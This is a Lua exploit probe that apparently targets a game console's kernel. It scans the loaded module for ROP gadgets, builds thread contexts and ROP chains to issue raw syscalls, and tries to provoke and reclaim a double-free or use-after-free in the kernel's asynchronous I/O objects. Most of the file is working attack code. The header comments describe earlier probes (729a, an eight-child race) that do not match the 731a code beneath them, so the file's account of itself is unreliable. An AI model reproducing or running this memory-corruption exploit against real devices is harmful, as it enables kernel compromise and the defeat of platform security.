-- CRASH_CLASS: HIGH
-- PROBE 729a: contained syscall prober (native child, 6 register args)
--
-- Context: every earlier sweep called the number from the Lua thread, so a
-- blocking handler wedged the whole loader (561/562 in 711b, select(93)).
-- 726a proved a faulting thr_create child dies ALONE. A hung child should be
-- contained the same way: the parent times out, records "no-return" and moves on.
--
-- The child is started with RIP = syscall.pipe.fn_addr (the loader's own
-- trampoline), RAX/ARG registers set in the context, and [rsp] pointing at a
-- chain that stores RAX and then exits with thr_exit(431).

--
-- Context: 727a showed exactly two statuses of 0 per round with six 0x80020003,
-- but a 0 status proves nothing (the miss path at 8ad6fbae zeroes the slot
-- first). Path B has no [W+0x18] guard, so a follower that reaches the re-lookup
-- before the winner's clear at 8ad70003 frees the same 0x58 chunk twice.
--
-- A double free of W puts the same chunk in the free list twice. The next
-- non-block create takes 0x58 twice too -- S at 8b5c8b50 and then W in the loop
-- at 8ad72530 -- so the SAME chunk becomes both the shared object and the work
-- item. That is visible from userland: the object polls as something other
-- than 3, or its delete stops answering 0.
--
-- This probe races 8 children on one id of a block, then creates two objects
-- and polls them. Baseline pairs run first, with no race, to prove the detector
-- itself is quiet.

--
print("=== PROBE 731a: aio wait blocks on a pending item, then the item is deleted ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local want = limit - off
        if want > chunk then want = chunk end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
    return nil
end
print(string.format("[A] ebase=%X", ebase))
if ebase < 0x10000 then print("[A] no module base") return end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end
print(string.format("[A] eboot=%X poprax=%X poprdi=%X poprsi=%X poprdx=%X jmp$=%X",
    ebase, pop_rax, pop_rdi, pop_rsi, pop_rdx, jmp_g))

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local RCX, R10 = 0x060, 0x090
local W = mmap(page)

local function spawn(idpage, stat)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(stat))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(662))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local pout = mmap(page)

-- 663 aio_multi_wait(ids, count, out, timeout). Argument 4 is R10, which no
-- eboot gadget can pop, but the thread context can set it directly.
local st_rdi = find_pat(ebase, 0x494000, string.char(0x48,0x89,0x07,0xC3))  -- mov [rdi],rax; ret
print(string.format("[A] mov [rdi],rax;ret=%X", st_rdi or 0))

local sp = mk(135)
local fds = to_num(memory.alloc(64)); wq(fds, uint64(0))
local rvs = pcall(function() return sp(uint64(1), uint64(1), uint64(0), uint64(fds), uint64(0), uint64(0)) end)
local fd = rd(fds)
print(string.format("[A] socketpair ok=%s fd=%d", tostring(rvs), fd))

local D = to_num(memory.alloc(0x4000))
local buf = to_num(memory.alloc(0x4000))
local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400))
local st  = to_num(memory.alloc(0x400))
for k=0,0xFFF do wd(buf+k*4,0); wd(res+k*4,0) end
local function desc(at)
    wq(at+0x00, uint64(0)); wq(at+0x08, uint64(16))
    wq(at+0x10, uint64(buf)); wq(at+0x18, uint64(res))
    wd(at+0x20, fd); wd(at+0x24, 0)
end
desc(D); desc(D+0x28)
wd(ids, 0)
local cr, crv = pcall(function() return mk(669)(uint64(1+0x1000), uint64(D), uint64(2), uint64(1), uint64(ids), uint64(0)) end)
local base = rd(ids)
print(string.format("[A] block create n=2 ret=%s base=%08X", tostring(to_num(crv)), base))

wd(ids, base); wd(ids+4, base + 0x10000)
local pr, prv = pcall(function() return mk(664)(uint64(ids), uint64(2), uint64(st), uint64(0), uint64(0), uint64(0)) end)
print(string.format("[A] poll ret=%s id0=%08X id1=%08X", tostring(to_num(prv)), rd(st), rd(st+4)))

-- waiter child: RDI = ids page (arg1), also the store target
local function waiter(idv)
    local stack = mmap(page*4)
    local b = stack + 0x4000
    wq(b+0,  uint64(st_rdi))
    wq(b+8,  uint64(pop_rax)); wq(b+16, uint64(431))
    wq(b+24, uint64(fn));      wq(b+32, uint64(jmp_g))
    local ctx = memory.alloc(0x500); zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(b))
    wq(ctx+Ctx.RDI, uint64(idv));     wq(ctx+Ctx.RSI, uint64(1))
    wq(ctx+Ctx.RDX, uint64(st));      wq(ctx+RCX, uint64(0)); wq(ctx+R10, uint64(0))
    wq(ctx+Ctx.RAX, uint64(663))
    local tb = memory.alloc(8); wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0, rd(tb) or 0
end

local wid = base
local okw, tid = waiter(wid)
print(string.format("[B] waiter spawned=%s tid=%X", tostring(okw), tid))
sleep_ms(40)
print(string.format("[B] after 40ms ids[0]=%08X (unchanged means it is blocked)", rd(ids)))

local ds = to_num(memory.alloc(16))
wd(ids, base)
local dr, drv = pcall(function() return mk(662)(uint64(ids), uint64(1), uint64(ds), uint64(0), uint64(0), uint64(0)) end)
print(string.format("[C] delete id0 ret=%s status=%08X", tostring(to_num(drv)), rd(ds)))
wd(ids, base + 0x10000)
local dr2, drv2 = pcall(function() return mk(662)(uint64(ids), uint64(1), uint64(ds), uint64(0), uint64(0), uint64(0)) end)
print(string.format("[C] delete id1 ret=%s status=%08X", tostring(to_num(drv2)), rd(ds+4) == nil and 0 or rd(ds)))

sleep_ms(150)
print(string.format("[D] waiter return value=%08X  health=%d", rd(ids), to_num(native.fcall_with_rax(fn_ud, 20))))

-- reclaim: create fresh objects in the freed chunks and poll them
wd(ids, 0)
local cr2, crv2 = pcall(function() return mk(669)(uint64(1), uint64(D), uint64(2), uint64(1), uint64(ids), uint64(0)) end)
local base2 = rd(ids)
print(string.format("[E] reclaim create ret=%s base=%08X", tostring(to_num(crv2)), base2))
wd(ids, base2); wd(ids+4, base2 + 0x10000)
local pr2, prv2 = pcall(function() return mk(664)(uint64(ids), uint64(2), uint64(st), uint64(0), uint64(0), uint64(0)) end)
print(string.format("[E] reclaim poll ret=%s id0=%08X id1=%08X alive=%d", tostring(to_num(prv2)), rd(st), rd(st+4),
    to_num(native.fcall_with_rax(fn_ud, 20))))
print("=== 731a DONE ===")
